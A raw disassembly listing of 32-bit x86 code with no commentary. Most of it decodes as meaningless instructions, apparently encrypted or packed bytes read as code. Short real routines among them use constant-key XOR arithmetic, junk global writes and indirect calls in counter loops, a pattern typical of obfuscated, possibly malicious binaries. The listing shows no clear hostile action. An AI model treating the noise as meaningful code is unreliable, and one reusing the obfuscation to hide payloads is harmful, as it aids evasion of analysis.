  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	mov    ds:0x5205ad92,al
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x404236
  4041e2:	mov    edi,0xca75d733
  4041e7:	sti    
  4041e8:	shl    DWORD PTR [esi],1
  4041ea:	js     0x4041d3
  4041ec:	(bad)  
  4041ed:	call   0xec7ffe18
  4041f2:	cdq    
  4041f3:	sub    DWORD PTR [ecx-0x10],ebp
  4041f6:	xchg   esi,eax
  4041f7:	pop    es
  4041f8:	mov    esi,0x811ab298
  4041fd:	push   ebx
  4041fe:	shl    DWORD PTR [ebx-0x42a0af5e],cl
  404204:	xchg   ebp,eax
  404205:	mov    ebx,esi
  404207:	mov    ecx,DWORD PTR [edx]
  404209:	jmp    0x40427a
  40420b:	adc    eax,0xe0c1b4ec
  404210:	aam    0xee
  404212:	mov    al,0x97
  404214:	aas    
  404215:	mov    cl,0xa2
  404217:	mov    cl,0xda
  404219:	mov    ah,0xc5
  40421b:	sar    BYTE PTR [edi],0xda
  40421e:	mov    DWORD PTR ds:0xc290e829,esp
  404224:	push   cs
  404225:	push   ebp
  404226:	aam    0xad
  404228:	scas   eax,DWORD PTR es:[edi]
  404229:	mov    dh,0x4b
  40422b:	pop    ebx
  40422c:	dec    edi
  40422d:	sub    esp,DWORD PTR [esi-0x29]
  404230:	mov    DWORD PTR [edi],esp
  404232:	sbb    al,0x6c
  404234:	or     dh,ch
  404236:	pusha  
  404237:	add    esp,edx
  404239:	arpl   WORD PTR [esi+0x68],bp
  40423c:	gs mov cl,al
  40423f:	or     eax,0x558d0318
  404244:	xchg   DWORD PTR [edx-0x1a],edx
  404247:	xchg   ebx,eax
  404248:	loop   0x4042bd
  40424a:	xchg   ebx,eax
  40424b:	add    bh,bh
  40424d:	jno    0x404296
  40424f:	in     eax,dx
  404250:	dec    edx
  404251:	cs fld st(0)
  404254:	mov    cl,0x7b
  404256:	dec    ecx
  404257:	(bad)  
  404258:	push   ebx
  404259:	in     eax,dx
  40425a:	mov    BYTE PTR [esi+0x15],bl
  40425d:	pop    edi
  40425e:	pop    ss
  40425f:	xlat   BYTE PTR ds:[ebx]
  404260:	push   ebp
  404261:	and    DWORD PTR [esi*8+0x583ceb45],edx
  404268:	rcl    BYTE PTR [edx],0xdd
  40426b:	hlt    
  40426c:	(bad)  
  40426d:	cmp    cl,dh
  40426f:	sbb    al,0x47
  404271:	ss mov ecx,0x121d6cd1
  404277:	(bad)  
  404278:	pop    esi
  404279:	jno    0x4042dd
  40427b:	dec    eax
  40427c:	repnz imul esp,DWORD PTR [edx+0x39],0x65b280cf
  404284:	mov    DWORD PTR [ebx+0x60],ecx
  404287:	xchg   edi,eax
  404288:	dec    esi
  404289:	data16 loop 0x404224
  40428c:	push   es
  40428d:	fs jne 0x4042d3
  404290:	push   esi
  404291:	lahf   
  404292:	pop    ss
  404293:	cdq    
  404294:	jbe    0x4042ab
  404296:	pop    edi
  404297:	mov    ecx,0x61bd9ff5
  40429c:	xchg   esi,eax
  40429d:	js     0x4042cd
  40429f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042a0:	push   esi
  4042a1:	iret   
  4042a2:	addr16 push 0x1e
  4042a5:	or     BYTE PTR [eax],0x1d
  4042a8:	dec    ecx
  4042a9:	xchg   esi,eax
  4042aa:	in     eax,0x61
  4042ac:	test   eax,0x6b18bd90
  4042b1:	aas    
  4042b2:	jo     0x40430d
  4042b4:	sar    BYTE PTR [eax],0x22
  4042b7:	imul   DWORD PTR [ecx+0x57]
  4042ba:	cmp    al,0x96
  4042bc:	xchg   edi,eax
  4042be:	cmc    
  4042bf:	jle    0x40428c
  4042c1:	xchg   esp,eax
  4042c2:	xor    al,0x19
  4042c4:	jge    0x40427e
  4042c6:	out    dx,eax
  4042c7:	add    bl,BYTE PTR [eax+eiz*2-0x58]
  4042cb:	mov    edx,DWORD PTR [edx+0x780c4005]
  4042d1:	or     eax,0x3136acd9
  4042d6:	push   esi
  4042d7:	dec    edx
  4042d8:	mov    bh,0xc7
  4042da:	push   ecx
  4042db:	inc    ecx
  4042dc:	cs mov bl,0x46
  4042df:	fidivr WORD PTR [ecx+0x79]
  4042e2:	jbe    0x404361
  4042e4:	sub    ah,BYTE PTR [edi]
  4042e6:	lds    edx,FWORD PTR [edi-0x73]
  4042e9:	mov    cs,WORD PTR [ecx]
  4042eb:	arpl   WORD PTR [edi],si
  4042ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042ee:	int    0xad
  4042f0:	imul   eax,DWORD PTR [ebp+0x22574a7d],0xab953cb8
  4042fa:	call   0xa9bf:0x9162c849
  404301:	xor    ch,al
  404303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404304:	adc    eax,DWORD PTR [ecx+0x5e50e206]
  40430a:	inc    ecx
  40430b:	push   eax
  40430c:	pop    ecx
  40430d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40430e:	in     eax,dx
  40430f:	out    dx,al
  404310:	test   DWORD PTR [esi+0x13],esi
  404313:	into   
  404314:	hlt    
  404315:	sub    cl,dl
  404317:	dec    ebp
  404318:	jns    0x404378
  40431a:	mov    dl,0x76
  40431c:	fidivr WORD PTR [ebx+0x2c3dafcb]
  404322:	jae    0x404347
  404324:	popf   
  404325:	cmp    al,0x5a
  404327:	xor    DWORD PTR [ebx+0x4c],esi
  40432a:	mov    esp,0xefb4215b
  40432f:	add    edx,DWORD PTR [esp+ecx*4]
  404332:	test   al,0xd
  404334:	mov    edi,0x3fb8ee07
  404339:	mov    dh,dh
  40433b:	pop    esi
  40433c:	sbb    ch,dh
  40433e:	adc    DWORD PTR [eax+0x29],edx
  404341:	adc    BYTE PTR [ecx],ch
  404343:	icebp  
  404344:	pop    ss
  404345:	sub    esi,DWORD PTR [ecx]
  404347:	repnz mov ebp,eax
  40434a:	shl    DWORD PTR [edx-0x6a],0xce
  40434e:	xor    al,0x36
  404350:	sti    
  404351:	in     eax,dx
  404352:	jp     0x404381
  404354:	inc    esi
  404355:	pop    eax
  404356:	cmp    esp,edi
  404358:	retf   0xa74f
  40435b:	sbb    eax,0xb8ebc810
  404360:	sub    ecx,ecx
  404362:	in     al,0x55
  404364:	dec    esi
  404365:	adc    al,0x80
  404367:	aas    
  404368:	inc    BYTE PTR [edi+0x7c]
  40436b:	fcmovnb st,st(6)
  40436d:	adc    ebp,DWORD PTR [ebp+0x12d0445e]
  404373:	stos   BYTE PTR es:[edi],al
  404374:	aam    0x79
  404376:	sub    edx,DWORD PTR [esi]
  404378:	jb     0x404355
  40437a:	mov    eax,ds:0xe15e6508
  40437f:	mov    ds:0xda1fc2f,al
  404384:	aas    
  404385:	inc    ebp
  404386:	jne    0x4043f7
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42edef,0x42e7c0
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ede7,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x430435,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42edef,0x430435
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x4304df,0x42e7c8
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e7cc,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ede3,0x42edeb
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42edeb,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x43044d,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	cli    
  40442d:	popf   
  40442e:	mov    ebx,0x7e19fdae
  404433:	jle    0x4043ce
  404435:	jg     0x4044b5
  404437:	jle    0x4043d4
  404439:	int    0xec
  40443b:	sub    eax,0xdfeba51e
  404440:	push   ebx
  404441:	outs   dx,BYTE PTR ds:[esi]
  404442:	mov    edi,0x78856de2
  404447:	(bad)
  40444a:	push   0x57
  40444c:	mov    bl,0x42
  40444e:	xlat   BYTE PTR ds:[ebx]
  40444f:	gs into 
  404451:	pusha  
  404452:	into   
  404453:	jbe    0x4044c2
  404455:	pop    eax
  404456:	pop    ds
  404457:	sbb    cl,bh
  404459:	popf   
  40445a:	je     0x40441f
  40445c:	and    BYTE PTR [edi+0x14],0x21
  404460:	cli    
  404461:	cmp    eax,0xdfb8351c
  404466:	sbb    DWORD PTR [eax-0x1f],edx
  404469:	xor    BYTE PTR [edi],0x83
  40446c:	inc    esp
  40446d:	fistp  QWORD PTR [ecx+0x7e]
  404470:	out    0xec,al
  404472:	cmp    edx,edi
  404474:	push   es
  404475:	pop    ds
  404476:	fsub   DWORD PTR [edi+0xf]
  404479:	mov    ds:0xbd916c2d,eax
  40447e:	inc    ebp
  40447f:	sub    eax,DWORD PTR [ebx+0x69]
  404482:	shr    BYTE PTR [esi],0x71
  404485:	or     eax,0x70e54d71
  40448a:	sub    eax,0xc2c49570
  40448f:	jmp    0xf562:0x649771f
  404496:	fcmovbe st,st(7)
  404498:	(bad)  
  404499:	leave  
  40449a:	cmp    BYTE PTR [ebp+0x3db0e3f2],ch
  4044a0:	cmp    edi,DWORD PTR [eax+esi*1-0x6e4ba22a]
  4044a7:	lock pop esi
  4044a9:	into   
  4044aa:	rcl    BYTE PTR [edi-0x32],1
  4044ad:	fwait
  4044ae:	test   BYTE PTR [edx+0x7cab9b6a],bh
  4044b4:	cdq    
  4044b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044b6:	in     al,0xf2
  4044b8:	je     0x404516
  4044ba:	ror    BYTE PTR [edi+0x2b],cl
  4044bd:	adc    DWORD PTR [edi],edi
  4044bf:	or     ecx,esp
  4044c1:	inc    ebx
  4044c2:	icebp  
  4044c3:	(bad)  
  4044c4:	repnz push edx
  4044c6:	inc    edi
  4044c7:	jae    0x40444a
  4044c9:	lods   eax,DWORD PTR ds:[esi]
  4044ca:	jp     0x4044d6
  4044cc:	or     bl,dh
  4044ce:	(bad)
  4044d2:	(bad)  
  4044d4:	test   BYTE PTR [esi+0x338cf5f],bh
  4044da:	(bad)  
  4044dc:	and    DWORD PTR [ecx],eax
  4044de:	dec    edx
  4044df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044e1:	xchg   cl,bh
  4044e3:	xor    DWORD PTR [esi],0x31744008
  4044e9:	lea    esi,[edi+0x7f]
  4044ec:	imul   esi,DWORD PTR [esi],0xffffffff
  4044ef:	imul   esp,ebx,0x38
  4044f2:	inc    ebp
  4044f3:	pop    ss
  4044f4:	inc    ebp
  4044f5:	into   
  4044f6:	pop    ebx
  4044f7:	lahf   
  4044f8:	jl     0x40451d
  4044fa:	mov    al,0xad
  4044fc:	ret    0x27a2
  4044ff:	test   BYTE PTR [eax+ecx*1-0x6d],cl
  404503:	enter  0xc2f2,0xcd
  404507:	dec    edi
  404508:	les    edi,FWORD PTR [esi-0x773db9c3]
  40450e:	adc    cl,0xaf
  404511:	nop
  404512:	das    
  404513:	(bad)  
  404514:	xor    dl,BYTE PTR [edx+0x4a]
  404517:	in     eax,dx
  404518:	ins    DWORD PTR es:[edi],dx
  404519:	adc    eax,0x8d9fab96
  40451e:	dec    edx
  40451f:	inc    ebx
  404520:	and    BYTE PTR [edx],0x38
  404523:	cmp    BYTE PTR [edi-0x7e],cl
  404526:	jbe    0x40453a
  404528:	leave  
  404529:	push   es
  40452a:	jbe    0x4045a0
  40452c:	inc    ebp
  40452d:	daa    
  40452e:	lds    ebp,FWORD PTR [edi]
  404530:	xchg   DWORD PTR [eax-0x38],esi
  404533:	push   esi
  404534:	mov    ds,WORD PTR [eax+0x5d]
  404537:	test   al,al
  404539:	sbb    al,0xc4
  40453b:	imul   eax,ebx,0x79
  40453e:	fwait
  40453f:	mov    ?,WORD PTR [ebx]
  404541:	pop    esi
  404542:	fst    DWORD PTR [ebp+0x1df06407]
  404548:	inc    eax
  404549:	xchg   edx,eax
  40454b:	mov    esp,0x4a3aad97
  404550:	cmp    eax,DWORD PTR es:[ecx]
  404553:	lods   eax,DWORD PTR ds:[esi]
  404554:	jo     0x4044e4
  404556:	imul   edx,DWORD PTR [ebx],0x4beba005
  40455c:	pop    esp
  40455d:	clc    
  40455e:	fcom   QWORD PTR ds:[edx]
  404561:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404563:	rol    DWORD PTR [ebx+0x2f],cl
  404566:	and    al,0xd1
  404568:	sbb    BYTE PTR [edx+0x40a23279],bh
  40456e:	cwde   
  40456f:	outs   dx,DWORD PTR ds:[esi]
  404570:	scas   al,BYTE PTR es:[edi]
  404571:	jae    0x4045cf
  404573:	fxch   st(2)
  404575:	xchg   esi,eax
  404576:	and    dh,bl
  404578:	xor    dl,al
  40457a:	fsub   st,st(4)
  40457c:	aad    0xe8
  40457e:	aaa    
  40457f:	dec    ebx
  404580:	clc    
  404581:	sbb    dh,BYTE PTR [edi]
  404583:	add    bl,BYTE PTR [ecx]
  404585:	or     al,0xd7
  404587:	mov    al,ds:0xc0ff006c
  40458c:	or     bl,BYTE PTR [eax+ebp*8+0x3]
  404590:	jmp    0x1b52f75e
  404595:	shl    al,0x5c
  404598:	add    al,0x3f
  40459a:	sbb    eax,ecx
  40459c:	out    dx,eax
  40459d:	xchg   ebp,eax
  40459e:	cmp    al,0xa2
  4045a0:	dec    ebx
  4045a1:	mov    edx,0x5500f948
  4045a6:	scas   eax,DWORD PTR es:[edi]
  4045a7:	jo     0x4045df
  4045a9:	or     dh,dh
  4045ab:	push   ecx
  4045ac:	push   cs
  4045ad:	inc    ebx
  4045ae:	js     0x404556
  4045b0:	mov    ebp,DWORD PTR [ecx+esi*8-0x5e]
  4045b4:	or     al,0x1c
  4045b6:	addr16 aas 
  4045b8:	xor    DWORD PTR [eax],ecx
  4045ba:	jmp    0x4045a3
  4045bc:	es xchg esp,eax
  4045be:	push   ebx
  4045bf:	push   ecx
  4045c0:	lds    esi,FWORD PTR [edi+0x393f46fe]
  4045c6:	add    BYTE PTR [edi-0x653ec2cf],cl
  4045cc:	jno    0x40462e
  4045ce:	pop    eax
  4045cf:	mov    dh,0x79
  4045d1:	add    DWORD PTR [ebp+0x7d00edb1],esp
  4045d7:	push   cs
  4045d8:	enter  0xf9ab,0xe1
  4045dc:	or     esp,esi
  4045de:	adc    DWORD PTR [ebx],eax
  4045e0:	rol    DWORD PTR [ebx],0xf1
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x4304e7,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x430439,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x430439
  40460c:	inc    eax
  40460d:	mov    ds:0x430439,eax
  404612:	cmp    DWORD PTR ds:0x430439,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x430439,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ec13
  404650:	cmp    DWORD PTR ds:0x430439,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x430439
  404662:	inc    eax
  404663:	mov    ds:0x430439,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42edd3,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x430439,0x430471
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x43045d,0x42eddb
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x4046c1
  4046fa:	xchg   BYTE PTR [ecx+edx*2],ch
  4046fd:	and    al,0x27
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x4046cb
  404706:	push   esi
  404707:	cmc    
  404708:	sub    eax,0x3b3c2082
  40470d:	sbb    DWORD PTR [esi+0x3aff29b9],eax
  404713:	fisttp DWORD PTR [ebx]
  404715:	and    al,0x1e
  404717:	mov    dl,0xa3
  404719:	stos   BYTE PTR es:[edi],al
  40471a:	xchg   ebx,eax
  40471b:	inc    esi
  40471c:	or     DWORD PTR [ebp-0x1fda5e7e],edx
  404722:	cmp    bl,BYTE PTR [edi+0x4c]
  404725:	dec    ecx
  404726:	call   DWORD PTR [edx]
  404728:	inc    eax
  404729:	mov    WORD PTR [edi+0x4a],?
  40472c:	push   ebx
  40472d:	sbb    BYTE PTR [ebx+0x5b],cl
  404730:	xor    DWORD PTR [edx],ebp
  404732:	in     eax,dx
  404733:	dec    eax
  404734:	mov    esp,DWORD PTR [edi]
  404736:	imul   ecx,DWORD PTR [ecx*2-0x8b58512],0xffffff95
  40473e:	sbb    al,0xb2
  404740:	mov    dl,0xfc
  404742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404743:	lock push edi
  404745:	mov    ch,0xbc
  404747:	enter  0xec43,0x9b
  40474b:	add    ebx,ecx
  40474d:	in     eax,0x2f
  40474f:	stc    
  404750:	(bad)  
  404751:	dec    ecx
  404752:	sub    eax,0x96a36877
  404757:	loop   0x40472c
  404759:	pcmpeqb mm6,QWORD PTR [edi-0x64]
  40475d:	aad    0x5a
  40475f:	fbld   TBYTE PTR [edi+0x15]
  404762:	ins    DWORD PTR es:[edi],dx
  404763:	data16 outs dx,BYTE PTR ds:[esi]
  404765:	ret    
  404766:	loopne 0x404715
  404768:	repnz push es
  40476a:	fldpi  
  40476c:	ins    DWORD PTR es:[edi],dx
  40476d:	pop    esp
  40476e:	test   BYTE PTR [ecx-0x57],bl
  404771:	neg    DWORD PTR [ebp-0x56]
  404774:	es stos DWORD PTR es:[edi],eax
  404776:	ja     0x40474d
  404778:	lahf   
  404779:	mov    dl,0xae
  40477b:	test   cl,0x36
  40477e:	or     eax,0x855fa841
  404783:	xor    eax,0x6ce2c0b7
  404788:	sub    al,0xe0
  40478a:	rcr    DWORD PTR [eax+0x2a9db589],cl
  404790:	lds    esi,FWORD PTR [esi+0x4e3fc40d]
  404796:	and    al,0x6c
  404798:	leave  
  404799:	jns    0x40471d
  40479b:	mov    eax,0x4144f5ae
  4047a0:	sub    dh,BYTE PTR [edi-0x146fff74]
  4047a6:	mov    ds:0x8793241b,al
  4047ab:	and    eax,0x2a472807
  4047b0:	ss repz data16 adc al,0x41
  4047b5:	mov    esp,0xca7dfc5f
  4047ba:	rol    BYTE PTR [esi+esi*1-0x6b],1
  4047be:	ret    
  4047bf:	pop    esi
  4047c0:	sbb    BYTE PTR [ebx],0xe8
  4047c3:	xor    BYTE PTR [edx-0x73],0xab
  4047c7:	sbb    DWORD PTR [ebx+0xf],0x91821a6a
  4047ce:	ins    DWORD PTR es:[edi],dx
  4047cf:	sar    BYTE PTR [esi],1
  4047d1:	out    0x55,al
  4047d3:	or     eax,0x1fc4bc82
  4047d8:	addr16 inc esp
  4047da:	mov    BYTE PTR [esi+0x3f],cl
  4047dd:	xchg   edx,eax
  4047de:	sbb    BYTE PTR [ebx],dl
  4047e0:	in     eax,0x11
  4047e2:	add    BYTE PTR [esi+ecx*2-0x2c],al
  4047e6:	lods   al,BYTE PTR ds:[esi]
  4047e7:	xor    eax,0x78097517
  4047ec:	jge    0x4047c4
  4047ee:	and    DWORD PTR [eax],eax
  4047f0:	fiadd  WORD PTR [edi]
  4047f2:	rcl    BYTE PTR [edx],cl
  4047f4:	jno    0x404849
  4047f6:	adc    bl,BYTE PTR [edx]
  4047f8:	and    eax,0x61fbfb98
  4047fd:	arpl   WORD PTR [eax],di
  4047ff:	or     BYTE PTR [edi+0x69539997],bl
  404805:	mov    bh,0x5
  404807:	out    0xb1,al
  404809:	cmp    BYTE PTR [esi+esi*2+0x30],0x1a
  40480e:	leave  
  40480f:	jp     0x404829
  404811:	fwait
  404812:	mov    eax,0x605b8834
  404817:	jp     0x404880
  404819:	jae    0x404837
  40481b:	hlt    
  40481c:	dec    edx
  40481d:	mov    bh,0x7b
  40481f:	ror    DWORD PTR [ebx+0x40],0x2d
  404823:	dec    esp
  404824:	loop   0x4047ee
  404826:	test   eax,esi
  404828:	add    ah,ah
  40482a:	lock loop 0x4047f8
  40482d:	and    DWORD PTR [esi-0x107724b8],0xa009959c
  404837:	sar    DWORD PTR [esi+0x1c],0x48
  40483b:	xchg   edx,eax
  40483c:	or     al,0x20
  40483e:	dec    esi
  40483f:	in     eax,0x1e
  404841:	mov    dl,0x97
  404843:	or     BYTE PTR [ebp-0xd8199ca],ah
  404849:	inc    ecx
  40484a:	aad    0x14
  40484c:	pusha  
  40484d:	mov    ch,0xd4
  40484f:	ror    BYTE PTR [eax-0x5cb2220a],0x1f
  404856:	daa    
  404857:	fistp  WORD PTR [esi-0x76c7195a]
  40485d:	es iret 
  40485f:	or     eax,0x3627c15
  404864:	and    BYTE PTR [ebx+0x2de22800],0x41
  40486b:	pop    ebx
  40486c:	cmp    al,0xa2
  40486e:	dec    edx
  40486f:	ror    BYTE PTR [ebp+0x1a405472],cl
  404875:	inc    ebx
  404876:	fisttp QWORD PTR [ebp-0x4c]
  404879:	jno    0x40485f
  40487b:	xchg   ebp,eax
  40487c:	scas   eax,DWORD PTR es:[edi]
  40487d:	sbb    BYTE PTR [esi+ecx*1],ah
  404880:	idiv   bh
  404882:	(bad)  
  404884:	sbb    eax,0x8d2bb20d
  404889:	ret    0x7c70
  40488c:	data16 out 0xce,al
  40488f:	mov    ds:0x2b71ffb8,al
  404894:	push   ss
  404895:	dec    esp
  404896:	sub    ebp,DWORD PTR [eax+0x7]
  404899:	xor    bh,BYTE PTR [eax]
  40489b:	fmul   QWORD PTR [ecx+0x4a268de6]
  4048a1:	pusha  
  4048a2:	push   ebp
  4048a3:	fstp   QWORD PTR [ebp+0x47]
  4048a6:	ficomp DWORD PTR [ebx+0x58b329ce]
  4048ac:	mov    ebp,0xa842afc3
  4048b1:	cmp    BYTE PTR [esi-0x5dc94bc8],bl
  4048b7:	jle    0x40484a
  4048b9:	jmp    0x4048e3
  4048bb:	test   ebp,ecx
  4048bd:	out    dx,al
  4048be:	push   edx
  4048bf:	scas   al,BYTE PTR es:[edi]
  4048c0:	cmp    eax,0x9e572d84
  4048c5:	stos   DWORD PTR es:[edi],eax
  4048c6:	enter  0xe6e3,0xd5
  4048ca:	daa    
  4048cb:	dec    esi
  4048cc:	sbb    al,0xd3
  4048ce:	xchg   ecx,eax
  4048cf:	jns    0x404855
  4048d1:	iret   
  4048d2:	xchg   ebp,eax
  4048d3:	and    al,0xbb
  4048d5:	stc    
  4048d6:	mov    eax,0xe52dea6a
  4048db:	pop    es
  4048dc:	jle    0x40486e
  4048de:	and    al,0x79
  4048e0:	jp     0x404955
  4048e2:	cld    
  4048e3:	cmp    BYTE PTR [eiz*8+0x1d57529d],bl
  4048ea:	sub    DWORD PTR [eax+0x75],0x3f27696f
  4048f1:	mov    ?,WORD PTR [edx-0x3b]
  4048f4:	sbb    eax,0xffe70bb9
  4048f9:	pop    ss
  4048fa:	arpl   cx,sp
  4048fc:	aas    
  4048fd:	scas   eax,DWORD PTR es:[edi]
  4048fe:	jecxz  0x40489e
  404900:	adc    BYTE PTR [ebp-0x8c6018e],dl
  404906:	outs   dx,DWORD PTR ds:[esi]
  404907:	nop
  404908:	ror    DWORD PTR ds:0x2a348814,1
  40490e:	xor    al,0x31
  404910:	ror    al,1
  404912:	xor    eax,0xb711f079
  404917:	fdivp  st(1),st
  404919:	hlt    
  40491a:	dec    edx
  40491b:	pusha  
  40491c:	(bad)  
  40491d:	das    
  40491e:	aaa    
  40491f:	mov    esi,0x479d58b7
  404924:	cmp    DWORD PTR [ebx+0x3712825b],0x602a2419
  40492e:	inc    ebp
  40492f:	idiv   bl
  404931:	pop    ebp
  404932:	mov    ebx,DWORD PTR [edx+0x3c]
  404935:	pop    ss
  404936:	loop   0x4048ee
  404938:	mov    ah,0x7a
  40493a:	push   es
  40493b:	in     al,dx
  40493c:	aaa    
  40493d:	push   edx
  40493e:	hlt    
  40493f:	mov    eax,0xde87e75c
  404944:	xrelease xchg DWORD PTR [ecx],ebx
  404947:	adc    al,0x26
  404949:	repnz adc BYTE PTR [edx],0xf3
  40494d:	mov    ds:0x6ed50819,eax
  404952:	shl    BYTE PTR [ecx-0x4c0b5a8e],1
  404958:	jb     0x4049a2
  40495a:	and    eax,0x42ba6c27
  40495f:	ins    BYTE PTR es:[edi],dx
  404960:	iret   
  404961:	vmread DWORD PTR [esi+0x77],edi
  404965:	mov    eax,0x8b07503d
  40496a:	pop    es
  40496b:	inc    ebx
  40496c:	push   edx
  40496d:	and    al,BYTE PTR [esi]
  40496f:	xchg   esi,eax
  404970:	(bad)  
  404971:	mov    esi,ebx
  404973:	(bad)  [edi+0x125085d3]
  404979:	in     eax,dx
  40497a:	add    edi,DWORD PTR [edx]
  40497c:	cmp    DWORD PTR [esi],edi
  40497e:	(bad)  
  40497f:	gs aas 
  404981:	in     al,dx
  404982:	mov    ds:0xb7bccfc5,eax
  404987:	jmp    0xeadf6c15
  40498c:	fsub   DWORD PTR [esp+esi*2+0x19b731a5]
  404993:	je     0x4049a2
  404995:	loope  0x404978
  404997:	outs   dx,DWORD PTR ds:[esi]
  404998:	fcomp  QWORD PTR [esi-0x2b9c17b]
  40499e:	inc    DWORD PTR [esi-0x412e1727]
  4049a4:	mov    DWORD PTR [edx],eax
  4049a6:	and    DWORD PTR ds:0x42e7d8,0x0
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e7d8
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e7d8,edx
  4049bf:	cmp    DWORD PTR ds:0x42e7d8,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e9cf
  4049da:	cmp    DWORD PTR ds:0x42e7d8,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e7d8
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e7d8,edx
  4049f4:	cmp    DWORD PTR ds:0x42e7d8,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42edeb,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x4304cf,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ede7,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x4304e3,0x4304df
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ede7,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x4304db
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
